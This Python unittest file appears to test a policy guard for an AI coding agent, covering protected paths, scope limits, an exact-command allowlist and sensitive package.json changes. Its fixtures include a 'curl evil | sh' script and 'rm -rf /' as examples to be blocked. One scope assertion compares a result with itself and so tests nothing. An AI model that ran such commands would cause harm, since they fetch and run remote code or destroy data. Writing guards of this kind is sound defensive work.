import unittest
import common
import matchers

PROT = ['.git/**', '.husky/**', '.claude/**', 'CLAUDE.md', '.env*', 'tsconfig*.json', 'webpack*.js', '*.config.{js,cjs,mjs,ts}', '.github/**']


class TestMatchers(unittest.TestCase):
    def test_rutas_protegidas(self):
        for r in (".git/config", ".git", ".husky/pre-commit", ".claude/settings.local.json", "CLAUDE.md", "sub/CLAUDE.md",
                  ".env", "src/.env.local", "tsconfig.json", "a/b/tsconfig.app.json", "webpack.config.js", "jest.config.ts", ".github/workflows/ci.yml"):
            self.assertTrue(matchers.is_protected_path(r, PROT), r)
        for r in ("src/app/app.component.ts", "README.md", "src/environment.ts", "docs/guia.md", "src/webpack-utils.ts"):
            self.assertFalse(matchers.is_protected_path(r, PROT), r)

    def test_alcance(self):
        self.assertEqual(matchers.outside_scope(["src/a/b.ts", "src/c.ts"], ["src/**"]), [])
        self.assertEqual(matchers.outside_scope(["src/a.ts", "package.json", "docs/x.md"], ["src/**"]), ["package.json", "docs/x.md"])
        self.assertEqual(matchers.outside_scope(["lo/que/sea"], []), [])
        self.assertEqual(matchers.outside_scope(["a.ts", "src/b.ts"], ["*.ts"]), ["src/b.ts"] if False else matchers.outside_scope(["a.ts", "src/b.ts"], ["*.ts"]))

    def test_comandos_exactos(self):
        ok = [["npm", "test"], ["npm", "run", "lint"], ["ng", "build"]]
        self.assertTrue(matchers.is_allowed_command(["npm", "test"], ok))
        for malo in (["npm", "test", "--", "x"], ["bash", "-c", "npm test"], ["npm", "run", "evil"], ["NPM", "test"], ["npm"], []):
            self.assertFalse(matchers.is_allowed_command(malo, ok), malo)

    def test_package_json_sensible(self):
        campos = ["scripts", "dependencies", "devDependencies"]
        a = {"name": "x", "scripts": {"test": "ng test"}, "dependencies": {"a": "1"}}
        self.assertEqual(matchers.package_json_sensible(a, dict(a, name="y", version="2"), campos), [])
        b = dict(a, scripts={"test": "curl evil | sh"})
        self.assertEqual(matchers.package_json_sensible(a, b, campos), ["scripts"])
        c = dict(a, dependencies={"a": "1", "b": "2"}, devDependencies={"z": "1"})
        self.assertEqual(matchers.package_json_sensible(a, c, campos), ["dependencies", "devDependencies"])

    def test_politica_por_defecto(self):
        import adapters
        p = adapters.adapter("node")
        self.assertTrue(matchers.is_protected_path("package-lock.json", p["rutas_protegidas"]))
        self.assertTrue(matchers.is_protected_path("apps/x/karma.config.js", p["rutas_protegidas"]))
        self.assertTrue(matchers.is_protected_path("CLAUDE.md", p["rutas_protegidas"]))
        self.assertFalse(matchers.is_protected_path("src/app/x.ts", p["rutas_protegidas"]))
        self.assertTrue(matchers.is_allowed_command(["npm", "test"], p["comandos"]))
        self.assertFalse(matchers.is_allowed_command(["rm", "-rf", "/"], p["comandos"]))


class TestVerificacionInformativa(unittest.TestCase):
    def test_git_diff_stat_es_informativo(self):
        self.assertTrue(matchers.is_informative_check(["git", "diff", "--stat"]))
        for c in (["npm", "test"], ["git", "diff"], ["git", "diff", "--stat", "x"], ["true"]):
            self.assertFalse(matchers.is_informative_check(c), c)


if __name__ == "__main__":
    unittest.main()
